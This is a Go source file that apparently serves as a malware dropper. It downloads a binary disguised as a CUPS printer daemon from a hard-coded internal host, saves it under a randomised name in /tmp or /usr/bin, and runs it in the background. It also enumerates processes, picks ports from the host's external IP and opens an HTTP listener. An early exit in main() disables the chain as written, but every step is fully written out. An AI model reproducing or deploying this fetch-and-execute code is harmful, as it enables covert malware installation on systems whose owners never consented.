package main

import (
	"fmt"
	"github.com/mitchellh/go-ps"
	"io/ioutil"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	dirArray      = []string{"/tmp/", "/usr/bin/"}
	nodeNameArray = []string{
		"Lc8Se1Eo9P", "Df3Me8Tb9Uh6", "Lt3Xh2Nz6Hy0Wp6Q", "Wh6Cc8Ma2Kk6Pw2", "Ax6Ww3Pz4Hn0Xz8",
		"Ab7Pm5Sn3H", "Js6Ti8Ta2Jd4Cw", "Sb9Gw5Qs3M", "Wr2Wq6Uv0Zf6", "Yb6In1Es2R", "Tz7Cw8Qu3O",
		"Uf4Ej0Jk8F", "Sl5Bz6Rz5E", "Kq2Br6Du0F", "Wu9Vv9Ac0M", "Tp4Nn6Dz6U", "Uz9Hi5Vw9Nj6At6Yr",
		"Sq8Xi4Tm6Hm8", "Si1Ce1Od9Ze6", "Sb7Gp1Mb5Aj", "Tk2Nk8Rc8Qf4Wm0We6W", "Wy2Zc2Bc7K",
		"Xa2By4Fb4Kr6Wp", "Pz3Pt9Fg3Qj5M", "Im6Fs4Du0Ka0", "Za4Bj9Em2K", "Et6Qi2Ls2Ct2Ip6H",
		"Wj2Xf3Xh5U", "Bl2Ph0Pl8So0Eh3", "Mk9Ne4Wd8Iw6Jo8"}
	basePort = int64(10000)
)

func isValidPort(port int64) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 1*time.Second)
	if err != nil {
		return true
	}
	defer conn.Close()
	return false
}

func getOutIP() string {
	response, err := http.Get("https://myexternalip.com/raw")
	if err != nil {
		return "127.0.0.1"
	}
	defer response.Body.Close()

	body, _ := ioutil.ReadAll(response.Body)
	return string(body)
}

func getExecData(execName string) error {
	response, err := http.Get("http://192.168.0.3:8000/cups-daemon-linux")
	if err != nil {
		return err
	}
	defer response.Body.Close()

	content, _ := ioutil.ReadAll(response.Body)
	err = ioutil.WriteFile(execName, content, 0744)
	if err != nil {
		return err
	}
	return nil
}

func InetNtoA(ip int64) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		byte(ip>>24), byte(ip>>16), byte(ip>>8), byte(ip))
}

func InetAtoN(ip string) int64 {
	ret := big.NewInt(0)
	ret.SetBytes(net.ParseIP(ip).To4())
	return ret.Int64()
}

func calcRandomPort() int64 {
	fmt.Println(getOutIP())
	outIntIP := InetAtoN(getOutIP())
	randPort := outIntIP % basePort

	if randPort < basePort {
		randPort += basePort
	}

	for {
		ok := isValidPort(randPort)
		if ok {
			return randPort
		}
		randPort += 1
	}
}

func FileExist(path string) bool {
	_, err := os.Lstat(path)
	return !os.IsNotExist(err)
}

func randomExecPath() string {
	baseLen := 10
	bytes := make([]byte, baseLen*3)
	for i := 0; i < baseLen; i++ {
		rand.Seed(time.Now().UnixNano())
		lowerB := rand.Intn(26) + 65
		upperB := rand.Intn(26) + 97
		digital := rand.Intn(10) + 48
		index := i * 3
		bytes[index] = byte(lowerB)
		bytes[index+1] = byte(upperB)
		bytes[index+2] = byte(digital)
	}

	length := rand.Intn(20)
	if length < baseLen {
		length = baseLen
	}

	execDir := "/"
	for _, dir := range dirArray {
		if FileExist(dir) {
			execDir = dir
			break
		}
	}
	return fmt.Sprintf(execDir + string(bytes[0:length]))
}

func runExe(execName string) error {
	bgExe := fmt.Sprintf("%s &", execName)
	cmd := exec.Command("bash", "-c", bgExe)
	err := cmd.Run()
	if err != nil {
		return err
	}
	return nil
}

func main() {

	fmt.Println(len(nodeNameArray))
	os.Exit(0)
	execName := randomExecPath()
	fmt.Println(execName)
	err := getExecData(execName)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(strings.Repeat("=", 80))
	fmt.Println(calcRandomPort())
	fmt.Println(strings.Repeat("+", 80))
	err = runExe(execName)
	fmt.Println(strings.Repeat("-", 80))
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(strings.Repeat("*", 80))
	fmt.Println(calcRandomPort())
	process, _ := ps.Processes()
	for _, value := range process {
		fmt.Println(value)
	}
	err = http.ListenAndServe(":9000", nil)
	if err != nil {
		fmt.Printf("HTTP Server start failed, err:%v\n", err)
		return
	}
}
